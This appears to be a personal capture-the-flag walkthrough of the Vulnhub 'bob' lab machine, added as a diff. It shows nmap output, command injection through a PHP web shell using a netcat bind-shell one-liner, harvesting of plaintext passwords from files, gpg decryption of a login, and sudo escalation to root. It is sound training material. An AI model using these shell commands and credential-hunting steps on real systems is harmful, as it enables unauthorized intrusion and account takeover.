@@ -1,0 +1,134 @@
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 4 disallowed entries 
+| /login.php /dev_shell.php /lat_memo.html 
+|_/passwords.html
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
+|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
+|_  256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)
+MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+robots.txt output...
+
+User-agent: *
+Disallow: /login.php
+Disallow: /dev_shell.php
+Disallow: /lat_memo.html
+Disallow: /passwords.html
+
+so there was a php shell and i was able to execute
+command with pipe ....
+
+so i tried the bind revershell an got success
+
+whoami | nc -lvp 4444 -e /bin/sh
+
+got the shell
+
+
+c0rruptedb1t:x:1000:1000:c0rruptedb1t,,,:/home/c0rruptedb1t:/bin/bash
+bob:x:1001:1001:Bob,,,,Not the smartest person:/home/bob:/bin/bash
+jc:x:1002:1002:James C,,,:/home/jc:/bin/bash
+seb:x:1003:1003:Sebastian W,,,:/home/seb:/bin/bash
+elliot:x:1004:1004:Elliot A,,,:/home/elliot:/bin/bash
+
+
+
+www-data@Milburg-High:/home/bob$ cat .old_passwordfile.html
+cat .old_passwordfile.html
+<html>
+<p>
+jc:Qwerty
+seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
+</p>
+</html>
+www-data@Milburg-High:/home/bob$
+
+
+
+seb@Milburg-High:/home/elliot$ strings theadminisdumb.txt 
+The admin is dumb,
+In fact everyone in the IT dept is pretty bad but I can
+t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them for that password file they made on the server. But the admin now he
+s quite something. Thinks he knows more than everyone else in the dept, he always yells at Sebastian and James now they do some dumb stuff but their new and this is just a high-school server who cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why do we need custom wallpapers that doesn
+t do anything. I have been suggesting time and time again to Bob ways we could improve the security since he 
+cares
+ about it so much but he just yells at me and says I don
+t know what i
+m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can
+t say the same for his friend James who doesn
+t care and made his password: Qwerty. To be honest James isn
+t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn
+t care about what I have to say. it
+s only a matter of time before it
+s broken into so because of this I have changed my password to
+theadminisdumb
+I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same time it doesn
+t affect me if they get breached, I get paid, he gets fired it
+s a good time.
+seb@Milburg-High:/home/elliot$ 
+
+
+ok se finnaly we've got the password of the user elliot ad ---> theadminisdumb
+
+let's login to elliot account
+
+ok so we have the password of the three server user as we can see...
+
+jc:Qwerty
+seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
+elliot:theadminisdumb
+
+
+
+#!/bin/bash
+clear
+echo "-= Notes =-"
+echo "Harry Potter is my faviorite"
+echo "Are you the real me?"
+echo "Right, I'm ordering pizza this is going nowhere"
+echo "People just don't get me"
+echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
+echo "Cucumber"
+echo "Rest now your eyes are sleepy"
+echo "Are you gonna stop reading this yet?"
+echo "Time to fix the server"
+echo "Everyone is annoying"
+echo "Sticky notes gotta buy em"
+
+
+To get the passphrase i have to see the walkthough.... 
+because i didn't make any sence for me...
+
+
+
+┌─[root@saims0n]─[~/Desktop/.machinenote/Vulnhub_boxes/New_list/bob]
+└──╼ #gpg --batch --passphrase HARPOCRATES -d login.txt.gpg
+gpg: AES encrypted data
+gpg: encrypted with 1 passphrase
+bob:b0bcat_
+┌─[root@saims0n]─[~/Desktop/.machinenote/Vulnhub_boxes/New_list/bob]
+└──╼ #
+
+bob@Milburg-High:/home/elliot$ sudo -l
+sudo: unable to resolve host Milburg-High: Connection refused
+[sudo] password for bob: 
+Matching Defaults entries for bob on Milburg-High:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bob may run the following commands on Milburg-High:
+    (ALL : ALL) ALL
+bob@Milburg-High:/home/elliot$ sudo -i
+sudo: unable to resolve host Milburg-High: Connection refused
+root@Milburg-High:~# whoami
+root
+root@Milburg-High:~# 
+
+
